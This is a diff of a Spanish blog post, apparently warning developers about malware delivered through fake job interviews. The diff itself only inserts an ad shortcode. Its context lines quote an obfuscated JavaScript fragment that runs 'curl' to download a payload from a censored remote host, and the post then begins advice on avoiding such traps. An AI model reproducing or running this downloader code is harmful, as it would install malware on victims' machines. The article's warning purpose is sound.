@@ -42,6 +42,8 @@ _0x42b722("curl -Lo \"" + _0x157519 + "\" \"" + "http://<censored>/pdown" + "\""
   })
 ```
 
+{{<ad>}}
+
 ## ¿Cómo evitamos caer en estas trampas?
 
 No planeo quedarme solo en el drama. Esto se trata de ofrecer algunas soluciones prácticas para que los script kiddies no te vean la cara de novato en una falsa entrevista de trabajo:
